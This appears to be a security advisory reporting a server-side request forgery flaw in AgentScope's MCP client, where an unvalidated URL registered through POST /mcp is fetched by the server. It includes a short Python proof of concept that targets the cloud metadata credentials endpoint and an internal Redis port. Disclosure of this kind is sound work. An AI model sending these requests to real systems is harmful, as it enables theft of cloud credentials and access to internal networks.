# AgentScope MCP SSRF — High (CVSS 8.6)

**Repository**: https://github.com/modelscope/agentscope
**Files**:
- `src/agentscope/mcp/_config.py:44-64` — `HttpMCPConfig` (no validation on `url`)
- `src/agentscope/mcp/_mcp_client.py:179-203` — `_create_http_client()` makes HTTP requests
- `src/agentscope/app/_schema/_mcp.py:74-79` — `MCPCreateRequest` (POST /mcp endpoint)

## Description

The MCP system's `HttpMCPConfig` accepts a `url` string that is **passed directly to `httpx.AsyncClient` or `sse_client`** without any validation (no IP blocklist, no URL scheme restriction, no DNS rebinding protection). The REST API endpoint `POST /mcp` allows attackers to register an HTTP MCP server pointing to any internal URL.

When the system initializes or uses the HTTP MCP client via `_create_http_client()` at `_mcp_client.py:179`, it connects to the attacker-specified URL. This enables Server-Side Request Forgery (SSRF) attacks against internal services.

## Affected Code

```python
# _mcp_client.py:179-203
def _create_http_client(self) -> _AsyncGeneratorContextManager[Any]:
    config = self.mcp_config
    if config.url.endswith("/sse") or config.url.endswith("/messages/"):
        return sse_client(
            url=config.url,             # <-- User-controlled, no validation
            ...
        )
    http_client = None
    if config.headers or config.timeout:
        http_client = httpx.AsyncClient(
            headers=config.headers,     # <-- User-controlled headers
            timeout=config.timeout,
        )
    return streamable_http_client(
        url=config.url,                 # <-- User-controlled, no validation
        http_client=http_client,
    )
```

```python
# _config.py:44-52
class HttpMCPConfig(BaseModel):
    type: Literal["http_mcp"] = "http_mcp"
    url: str = Field(
        title="URL",
        description="The URL of the MCP server.",
    )
    # No URL validation, no IP blocklist, no allowlist, no scheme check
```

## Attack Vector

Unauthenticated API access → POST /mcp → `mcp_config.url` set to internal URL → `_create_http_client()` connects → SSRF with response potentially visible to attacker

## Proof of Concept

```python
import requests

# SSRF to cloud metadata endpoint
requests.post("http://target:5000/mcp", json={
    "name": "aws_meta",
    "connection_scope": "shared",
    "mcp_config": {
        "type": "http_mcp",
        "url": "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2"
    }
})

# SSRF to internal service (e.g., Redis)
requests.post("http://target:5000/mcp", json={
    "name": "internal_redis",
    "connection_scope": "shared",
    "mcp_config": {
        "type": "http_mcp",
        "url": "http://localhost:6379/"
    }
})
```

## Impact

- Cloud instance metadata exfiltration (AWS, GCP, Azure credentials)
- Internal network scanning and service discovery
- Access to internal web applications, databases, and caches
- Bypass of network perimeter firewalls
